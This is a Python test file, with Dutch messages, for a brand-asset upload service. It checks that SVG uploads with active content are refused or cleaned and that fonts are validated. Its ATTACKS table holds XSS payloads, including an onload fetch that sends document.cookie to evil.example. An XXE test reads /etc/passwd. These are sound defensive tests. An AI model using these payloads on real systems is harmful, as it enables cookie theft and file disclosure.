"""Uploads van merkmateriaal: SVG-opschoning, fontcontrole en soorten."""

import io
import os

import pytest
from fontTools.ttLib import TTFont

from app.domain.fonts import FontRejected, inspect_font
from app.domain.images import UnsupportedFile, ingest_image
from app.domain.svg_sanitize import SvgRejected, sanitize_svg
from app.settings import get_settings

ATTACKS = {
    "onload": b'<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil.example/\'+document.cookie)"><rect width="10" height="10"/></svg>',
    "foreignObject": b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"/></foreignObject><circle r="4"/></svg>',
    "external": b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://tracker.example/p.png"/></svg>',
    "script": b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><a href="javascript:alert(1)"><rect width="1" height="1"/></a></svg>',
    "css": b'<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/x)" width="1" height="1"/></svg>',
}


@pytest.mark.parametrize("name", list(ATTACKS))
def test_uploads_with_active_svg_content_are_refused(name: str) -> None:
    with pytest.raises(UnsupportedFile, match="actieve inhoud"):
        ingest_image(ATTACKS[name], "logo.svg")


@pytest.mark.parametrize("name", list(ATTACKS))
def test_sanitizer_strips_dangerous_content_as_second_line(name: str) -> None:
    cleaned, removed = sanitize_svg(ATTACKS[name])
    lower = cleaned.lower()
    assert removed > 0
    for bad in (b"onload", b"foreignobject", b"iframe", b"script", b"javascript:", b"https://"):
        assert bad not in lower, (name, cleaned)


def test_svg_with_dtd_or_entities_is_refused() -> None:
    xxe = b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'
    with pytest.raises(SvgRejected):
        sanitize_svg(xxe)
    with pytest.raises(UnsupportedFile):
        ingest_image(xxe, "logo.svg")


def test_editor_metadata_is_removed_silently() -> None:
    inkscape = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" '
        b'inkscape:version="1.3"><inkscape:grid/><rect width="1" height="1"/></svg>'
    )
    image = ingest_image(inkscape, "logo.svg")
    assert b"inkscape" not in image.data and b"<rect" in image.data


def test_legitimate_svg_survives_intact() -> None:
    logo = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 40">'
        b'<defs><linearGradient id="g"><stop offset="0" stop-color="#e8b33f"/></linearGradient></defs>'
        b'<path id="p" d="M0 0h10v10z" fill="url(#g)"/><use xlink:href="#p" x="20"/>'
        b'<text x="40" y="30" font-family="Inter" font-size="20">Flow</text></svg>'
    )
    cleaned, removed = sanitize_svg(logo)
    assert removed == 0
    for keep in (b"linearGradient", b'd="M0 0h10v10z"', b'href="#p"', b"Flow"):
        assert keep in cleaned


def test_non_svg_xml_is_refused() -> None:
    with pytest.raises(SvgRejected):
        sanitize_svg(b"<html><body>hoi</body></html>")


SEED_FONT = get_settings().seed_dir / "fonts" / "inter-latin-400-normal.woff2"


def test_real_font_is_accepted_with_family_name() -> None:
    info = inspect_font(SEED_FONT.read_bytes())
    assert info.mime == "font/woff2"
    assert "Inter" in info.family


def test_renamed_non_font_is_refused() -> None:
    with pytest.raises(FontRejected, match="geen fontbestand"):
        inspect_font(b"dit is gewoon tekst, geen font" * 10)


def test_font_with_restricted_embedding_is_refused() -> None:
    font = TTFont(io.BytesIO(SEED_FONT.read_bytes()))
    font["OS/2"].fsType = 0x0002
    buffer = io.BytesIO()
    font.save(buffer)
    with pytest.raises(FontRejected, match="restricted license embedding"):
        inspect_font(buffer.getvalue())


def test_corrupt_font_is_refused() -> None:
    with pytest.raises(FontRejected):
        inspect_font(b"wOF2" + b"\x00" * 200)


# ------------------------------------------------------------------ API (met database)

needs_db = pytest.mark.skipif(
    not os.environ.get("TEST_DATABASE_URL"), reason="TEST_DATABASE_URL niet gezet"
)


@pytest.fixture(scope="module")
def client():
    from fastapi.testclient import TestClient

    from app import seed
    from app.db import Base, engine
    from app.main import create_app

    if "test" not in (engine.url.database or ""):
        pytest.exit(f"Weiger tests te draaien tegen database {engine.url.database!r}", returncode=2)
    Base.metadata.drop_all(engine)
    Base.metadata.create_all(engine)
    seed.main()
    return TestClient(create_app())


def _login(client, email: str) -> str:
    client.cookies.clear()
    client.post("/api/auth/dev-login", json={"email": email})
    return client.get("/api/companies").json()[0]["id"]


def _png(alpha: bool) -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    Image.new(
        "RGBA" if alpha else "RGB", (40, 40), (10, 20, 30, 0) if alpha else (10, 20, 30)
    ).save(buffer, "PNG" if alpha else "JPEG")
    return buffer.getvalue()


@needs_db
def test_upload_kinds_are_validated_and_brand_kinds_need_admin(client) -> None:
    company = _login(client, "editor@example.test")
    form = {"company_id": company, "kind": "element"}
    assert (
        client.post("/api/assets", data=form, files={"file": ("e.png", _png(True))}).status_code
        == 403
    )
    assert (
        client.post(
            "/api/assets", data={**form, "kind": "virus"}, files={"file": ("e.png", _png(True))}
        ).status_code
        == 422
    )
    company = _login(client, "admin@example.test")
    ok = client.post(
        "/api/assets", data={**form, "company_id": company}, files={"file": ("e.png", _png(True))}
    )
    assert ok.status_code == 200 and ok.json()["kind"] == "element"
    jpeg = client.post(
        "/api/assets", data={**form, "company_id": company}, files={"file": ("e.jpg", _png(False))}
    )
    assert jpeg.status_code == 415 and "transparant" in jpeg.json()["detail"]
    bg = client.post(
        "/api/assets",
        data={"company_id": company, "kind": "background"},
        files={"file": ("b.jpg", _png(False))},
    )
    assert bg.status_code == 200
    assert {
        a["kind"] for a in client.get(f"/api/assets?company_id={company}&kind=background").json()
    } == {"background"}


@needs_db
def test_svg_upload_refuses_active_content_and_is_served_with_csp(client) -> None:
    company = _login(client, "admin@example.test")
    evil = client.post(
        "/api/assets",
        data={"company_id": company, "kind": "element"},
        files={"file": ("x.svg", ATTACKS["onload"])},
    )
    assert evil.status_code == 415 and "actieve inhoud" in evil.json()["detail"]
    response = client.post(
        "/api/assets",
        data={"company_id": company, "kind": "element"},
        files={
            "file": ("ok.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>')
        },
    )
    assert response.status_code == 200, response.text
    served = client.get(f"/api/assets/{response.json()['id']}/file")
    assert "default-src 'none'" in served.headers["content-security-policy"]
    assert served.headers["x-content-type-options"] == "nosniff"


@needs_db
def test_font_upload_records_family_and_refuses_fakes(client) -> None:
    company = _login(client, "admin@example.test")
    fake = client.post(
        "/api/assets",
        data={"company_id": company, "kind": "font"},
        files={"file": ("f.ttf", b"geen font" * 20)},
    )
    assert fake.status_code == 415
    real = client.post(
        "/api/assets",
        data={"company_id": company, "kind": "font"},
        files={"file": ("inter.woff2", SEED_FONT.read_bytes())},
    )
    assert real.status_code == 200
    assert "Inter" in real.json()["provenance"]["fontFamily"]
